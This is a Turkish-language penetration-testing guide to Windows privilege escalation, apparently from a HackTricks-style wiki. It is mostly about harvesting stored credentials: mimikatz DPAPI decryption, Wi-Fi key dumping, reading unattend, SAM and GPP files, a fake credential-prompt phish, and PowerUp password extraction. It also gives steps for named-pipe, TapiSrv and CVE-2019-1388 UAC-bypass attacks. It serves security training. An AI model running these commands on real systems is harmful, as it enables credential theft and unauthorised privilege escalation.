**Data Protection API (DPAPI)**, verilerin simetrik şifrelenmesi için bir yöntem sağlar ve ağırlıklı olarak Windows işletim sistemi içinde asimetrik özel anahtarların simetrik şifrelenmesinde kullanılır. Bu şifreleme, entropy'ye önemli ölçüde katkıda bulunmak için bir kullanıcı veya sistem secret'ından yararlanır.

**DPAPI, kullanıcı giriş secret'larından türetilen bir simetrik key aracılığıyla key'lerin şifrelenmesini sağlar**. Sistem şifrelemesi söz konusu olduğunda, sistemin domain authentication secret'larını kullanır.

DPAPI kullanılarak şifrelenen kullanıcı RSA key'leri, `{SID}` kullanıcının [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) değerini temsil etmek üzere `%APPDATA%\Microsoft\Protect\{SID}` directory'sinde depolanır. **Aynı file içinde kullanıcının private key'lerini koruyan master key ile birlikte bulunan DPAPI key**, genellikle 64 byte'lık rastgele veriden oluşur. (Bu directory'ye erişimin kısıtlı olduğunu ve içeriğinin CMD'de `dir` command'i kullanılarak listelenemediğini, ancak PowerShell üzerinden listelenebildiğini unutmayın.)
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Uygun bağımsız değişkenlerle (`/pvk` veya `/rpc`) şifresini çözmek için **mimikatz module** `dpapi::masterkey` kullanabilirsiniz.

**master password tarafından korunan credentials files** genellikle şu konumda bulunur:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Uygun `/masterkey` ile **mimikatz module** `dpapi::cred` kullanarak şifrelerini çözebilirsiniz.\
`sekurlsa::dpapi` module ile **memory** üzerinden birçok **DPAPI** **masterkey** çıkarabilirsiniz (root iseniz).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Kimlik Bilgileri

**PowerShell kimlik bilgileri**, şifrelenmiş kimlik bilgilerini kolayca depolamak için **scripting** ve otomasyon görevlerinde sıklıkla kullanılır. Kimlik bilgileri **DPAPI** kullanılarak korunur; bu genellikle yalnızca oluşturuldukları bilgisayarda aynı kullanıcı tarafından şifrelerinin çözülebileceği anlamına gelir.

Bir PS kimlik bilgisinin bulunduğu dosyadan şifresini çözmek için şunu yapabilirsiniz:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wi-Fi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Kaydedilmiş RDP Bağlantıları

Bunları `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
ve `HKCU\Software\Microsoft\Terminal Server Client\Servers\` konumlarında bulabilirsiniz.

### Son Çalıştırılan Komutlar
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Uzak Masaüstü Kimlik Bilgisi Yöneticisi**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
**Mimikatz** `dpapi::rdg` modülünü uygun `/masterkey` ile kullanarak **herhangi bir .rdg dosyasının şifresini çözün**\
Mimikatz `sekurlsa::dpapi` modülüyle bellekten **birçok DPAPI masterkey'i çıkarabilirsiniz**

### Sticky Notes

Kullanıcılar Windows iş istasyonlarında Sticky Notes uygulamasını genellikle **şifreleri** ve diğer bilgileri **kaydetmek** için kullanır; bunun bir veritabanı dosyası olduğunun farkında değildir. Bu dosya `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` konumunda bulunur ve aranıp incelenmeye her zaman değerdir.

### AppCmd.exe

**AppCmd.exe'den şifreleri kurtarmak için Administrator olmanız ve High Integrity level altında çalışmanız gerektiğini unutmayın.**\
**AppCmd.exe**, `%systemroot%\system32\inetsrv\` dizininde bulunur.\
Bu dosya mevcutsa bazı **kimlik bilgilerinin** yapılandırılmış ve **kurtarılabilir** olması mümkündür.

Bu kod [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) aracından çıkarılmıştır:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` dosyasının mevcut olup olmadığını kontrol edin .\
**Installer'lar SYSTEM yetkileriyle çalıştırılır**, birçoğu **DLL Sideloading'e karşı savunmasızdır (Bilgi kaynağı:** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Dosyalar ve Registry (Kimlik Bilgileri)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Anahtarları
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Registry'deki SSH keys

SSH private keys, `HKCU\Software\OpenSSH\Agent\Keys` registry key'inin içinde depolanabilir; bu nedenle burada ilginç bir şey olup olmadığını kontrol etmelisiniz:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Bu yolun içinde herhangi bir kayıt bulursanız, bu muhtemelen kaydedilmiş bir SSH anahtarıdır. Şifrelenmiş olarak saklanır ancak [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) kullanılarak kolayca çözülebilir.\
Bu teknik hakkında daha fazla bilgi: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

`ssh-agent` service çalışmıyorsa ve açılışta otomatik olarak başlamasını istiyorsanız, şunu çalıştırın:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Görünüşe göre bu technique artık geçerli değil. Bazı SSH anahtarları oluşturmaya, bunları `ssh-add` ile eklemeye ve SSH üzerinden bir makineye giriş yapmaya çalıştım. HKCU\Software\OpenSSH\Agent\Keys registry anahtarı mevcut değil ve procmon, asymmetric key authentication sırasında `dpapi.dll` kullanımını tespit etmedi.

### Katılımsız dosyalar
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Bu dosyaları **metasploit** kullanarak da arayabilirsiniz: _post/windows/gather/enum_unattend_

Örnek içerik:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM ve SYSTEM yedekleri
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Bulut Kimlik Bilgileri
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml** adlı bir dosya için arama yapın.

### Önbelleğe Alınmış GPP Password

Daha önce, Group Policy Preferences (GPP) aracılığıyla bir makine grubunda özel yerel yönetici hesaplarının dağıtılmasına olanak tanıyan bir özellik mevcuttu. Ancak bu yöntemin ciddi güvenlik açıkları vardı. İlk olarak, SYSVOL'da XML dosyaları olarak depolanan Group Policy Objects (GPO'lar) herhangi bir domain kullanıcısı tarafından erişilebilir durumdaydı. İkinci olarak, herkese açık şekilde belgelenmiş varsayılan bir anahtar kullanılarak AES256 ile şifrelenen bu GPP'lerdeki password'ler, kimliği doğrulanmış herhangi bir kullanıcı tarafından çözülebiliyordu. Bu durum, kullanıcıların yükseltilmiş ayrıcalıklar elde etmesine olanak tanıyabileceğinden ciddi bir risk oluşturuyordu.

Bu riski azaltmak amacıyla, boş olmayan bir `"cpassword"` alanı içeren yerel olarak önbelleğe alınmış GPP dosyalarını tarayan bir işlev geliştirildi. Böyle bir dosya bulunduğunda işlev password'ü çözer ve özel bir PowerShell nesnesi döndürür. Bu nesne, GPP ve dosyanın konumu hakkında ayrıntılar içerir ve bu güvenlik açığının tespit edilmesine ve giderilmesine yardımcı olur.

Bu dosyaları bulmak için `C:\ProgramData\Microsoft\Group Policy\history` veya _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista öncesi)_ konumlarında arama yapın:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword'ü çözmek için:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Parolaları almak için crackmapexec kullanma:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Kimlik bilgileri içeren web.config örneği:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN kimlik bilgileri
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Günlükler
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Kimlik bilgilerini iste

Kullanıcının bunları bilebileceğini düşünüyorsanız, kullanıcıdan her zaman **kendi kimlik bilgilerini ve hatta farklı bir kullanıcının kimlik bilgilerini girmesini isteyebilirsiniz** (istemciden doğrudan **kimlik bilgilerini** **istemek** gerçekten **risklidir**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Kimlik bilgilerini içerebilecek olası dosya adları**

Geçmişte **parolalar** içeren, **açık metin** veya **Base64** biçimindeki bilinen dosyalar
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Önerilen tüm dosyalarda arama yapın:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Geri Dönüşüm Kutusundaki Kimlik Bilgileri

Kimlik bilgilerini bulmak için Çöp Kutusu'nu da kontrol etmelisiniz.

Çeşitli programlar tarafından kaydedilen **parolaları kurtarmak** için şunu kullanabilirsiniz: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Kayıt defterinde

**Kimlik bilgileri içerebilecek diğer olası kayıt defteri anahtarları**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Tarayıcı Geçmişi

**Chrome veya Firefox** parolalarının depolandığı db'leri kontrol etmelisiniz.\
Ayrıca tarayıcıların geçmişini, yer imlerini ve favouritelerini de kontrol edin; belki bazı **parolalar** burada depolanmıştır.

Tarayıcılardan parola çıkarmak için araçlar:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)**, farklı dillerdeki yazılım bileşenleri arasında **iletişime** olanak tanıyan, Windows işletim sistemine entegre edilmiş bir teknolojidir. Her COM bileşeni bir **class ID (CLSID)** aracılığıyla **tanımlanır** ve her bileşen, interface ID'leri (IID'ler) aracılığıyla tanımlanan bir veya daha fazla interface üzerinden işlevsellik sunar.

COM sınıfları ve interface'leri sırasıyla **HKEY\CLASSES\ROOT\CLSID** ve **HKEY\CLASSES\ROOT\Interface** altında registry'de tanımlanır. Bu registry, **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** birleştirilerek oluşturulur ve **HKEY\CLASSES\ROOT**'u meydana getirir.

Bu registry'nin CLSID'leri içinde, bir **DLL**'yi gösteren bir **varsayılan değer** ve **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single veya Multi) ya da **Neutral** (Thread Neutral) olabilen **ThreadingModel** adlı bir değer içeren alt registry **InProcServer32**'yi bulabilirsiniz.

![Tarayıcı Geçmişi - COM DLL Overwriting: Bu registry'nin CLSID'leri içinde, bir DLL'yi gösteren bir varsayılan değer ve ... adlı bir değer içeren alt registry InProcServer32'yi bulabilirsiniz.](<../../images/image (729).png>)

Temel olarak, yürütülecek **DLL'lerden** herhangi birinin üzerine yazabiliyorsanız ve bu DLL farklı bir kullanıcı tarafından yürütülecekse **yetkileri yükseltebilirsiniz**.

Saldırganların COM Hijacking'i bir persistence mekanizması olarak nasıl kullandığını öğrenmek için şuraya bakın:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Dosyalarda ve registry'de Generic Password search**

**Dosya içeriklerinde arama yapın**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Belirli bir dosya adıyla dosya arama**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Kayıt defterinde anahtar adlarını ve parolaları arayın**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Parola arayan araçlar

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **bir msf** plugin'idir; bu plugin'i, victim içinde credential arayan her metasploit POST module'ünü **otomatik olarak çalıştırmak** için oluşturdum.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) bu sayfada belirtilen parolaları içeren tüm dosyaları otomatik olarak arar.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) bir sistemden parola çıkarmak için kullanılan bir diğer harika araçtır.

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) aracı, bu verileri clear text olarak kaydeden çeşitli araçların (**PuTTY**, **WinSCP**, **FileZilla**, **SuperPuTTY** ve **RDP**) **session**'larını, **kullanıcı adlarını** ve **parolalarını** arar.
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

**SYSTEM olarak çalışan bir process'in** (`OpenProcess()`) **full access** ile yeni bir process **açtığını** düşünün. Aynı process ayrıca **düşük ayrıcalıklara sahip, ancak ana process'in tüm açık handle'larını devralan** yeni bir process **oluşturur** (`CreateProcess()`).\
Ardından, **düşük ayrıcalıklı process'e full access** elde ederseniz, `OpenProcess()` ile oluşturulan ayrıcalıklı process'e ait **açık handle'ı** alabilir ve **bir shellcode enjekte edebilirsiniz**.\
**Bu zafiyetin nasıl tespit edilip exploit edileceği** hakkında daha fazla bilgi için [bu örneği okuyun.](leaked-handle-exploitation.md)\
**Farklı izin seviyeleriyle devralınan process ve thread'lere ait daha fazla açık handle'ın (yalnızca full access değil) nasıl test edilip abuse edileceği hakkında daha kapsamlı bir açıklama** için [**bu diğer yazıyı okuyun**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

**Pipe** olarak adlandırılan paylaşılan memory segment'leri, process iletişimini ve veri aktarımını mümkün kılar.

Windows, birbiriyle ilişkili olmayan process'lerin farklı network'ler üzerinden bile veri paylaşmasına olanak tanıyan **Named Pipes** adlı bir özellik sunar. Bu yapı, rollerin **named pipe server** ve **named pipe client** olarak tanımlandığı client/server mimarisine benzer.

Bir **client** bir pipe üzerinden veri gönderdiğinde, pipe'ı oluşturan **server**, gerekli **SeImpersonate** haklarına sahip olması koşuluyla **client'ın kimliğine bürünebilir**. Taklit edebileceğiniz bir pipe üzerinden iletişim kuran **ayrıcalıklı bir process** tespit etmek, kurduğunuz pipe ile etkileşime girdiğinde bu process'in kimliğini benimseyerek **daha yüksek ayrıcalıklar elde etme** fırsatı sağlar. Böyle bir saldırının nasıl gerçekleştirileceğine ilişkin faydalı kılavuzlara [**buradan**](named-pipe-client-impersonation.md) ve [**buradan**](#from-high-integrity-to-system) ulaşabilirsiniz.

Ayrıca aşağıdaki araç, **burp gibi bir araçla named pipe iletişimini yakalamanıza** olanak tanır: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **ve bu araç, privesc'leri bulmak için tüm pipe'ları listeleyip görmenizi sağlar:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Server mode'daki Telephony service (TapiSrv), `\\pipe\\tapsrv` (MS-TRP) endpoint'ini açığa çıkarır. Remote authenticated bir client, mailslot tabanlı async event yolunu abuse ederek `ClientAttach` işlemini, `NETWORK SERVICE` tarafından yazılabilir mevcut herhangi bir dosyaya arbitrary **4-byte write** gerçekleştirecek şekilde kullanabilir; ardından Telephony admin haklarını elde edip service olarak arbitrary bir DLL yükleyebilir. Tam akış:

- `pszDomainUser`, yazılabilir mevcut bir path olarak ayarlanmış şekilde `ClientAttach` çağrılır → service, bu path'i `CreateFileW(..., OPEN_EXISTING)` üzerinden açar ve async event yazımları için kullanır.
- Her event, `Initialize` içindeki attacker-controlled `InitContext` değerini bu handle'a yazar. `LRegisterRequestRecipient` (`Req_Func 61`) ile bir line app register edilir, `TRequestMakeCall` (`Req_Func 121`) tetiklenir, `GetAsyncEvents` (`Req_Func 0`) ile alınır, ardından deterministic yazımları tekrarlamak için unregister/shutdown yapılır.
- `C:\Windows\TAPI\tsec.ini` içindeki `[TapiAdministrators]` grubuna kendinizi ekleyin, reconnect yapın ve `GetUIDllName` fonksiyonunu arbitrary bir DLL path'i ile çağırarak `TSPI_providerUIIdentify` fonksiyonunu `NETWORK SERVICE` olarak execute edin.

Daha fazla ayrıntı:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Çeşitli

### Windows'ta çalıştırılabilecek File Extension'lar

**[https://filesec.io/](https://filesec.io/)** sayfasına göz atın.

### Protocol handler / ShellExecute abuse via Markdown renderers

`ShellExecuteExW` fonksiyonuna iletilen tıklanabilir Markdown link'leri, tehlikeli URI handler'larını (`file:`, `ms-appinstaller:` veya kayıtlı herhangi bir scheme) tetikleyebilir ve attacker-controlled dosyaları mevcut user olarak execute edebilir. Bkz.:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Password'ler için Command Line'ları Monitoring Etme**

Bir user olarak shell elde ettiğinizde, **credential'ları command line üzerinde geçiren** scheduled task'ler veya diğer process'ler çalıştırılıyor olabilir. Aşağıdaki script, her iki saniyede bir process command line'larını yakalar ve mevcut durumu önceki durumla karşılaştırarak farklılıkları çıktı olarak verir.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Processlerden parola çalma

## Düşük Yetkili Kullanıcıdan NT\AUTHORITY SYSTEM'e (CVE-2019-1388) / UAC Bypass

Grafik arayüze (konsol veya RDP aracılığıyla) erişiminiz varsa ve UAC etkinse, Microsoft Windows'un bazı sürümlerinde ayrıcalıksız bir kullanıcı olarak "NT\AUTHORITY SYSTEM" yetkileriyle bir terminal veya başka herhangi bir process çalıştırmak mümkündür.

Bu, aynı vulnerability ile hem yetkileri yükseltmeyi hem de UAC'yi bypass etmeyi mümkün kılar. Ayrıca herhangi bir şey yüklemeye gerek yoktur ve işlem sırasında kullanılan binary Microsoft tarafından imzalanmış ve yayımlanmıştır.

Etkilenen sistemlerden bazıları şunlardır:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Bu güvenlik açığından yararlanmak için aşağıdaki adımların gerçekleştirilmesi gerekir:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
Elinizde gerekli tüm dosyalar ve bilgiler aşağıdaki GitHub repository'sinde bulunmaktadır:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Administrator Medium'dan High Integrity Level / UAC Bypass'e

**Integrity Levels** hakkında bilgi edinmek için bunu okuyun:


{{#ref}}
integrity-levels.md
{{#endref}}

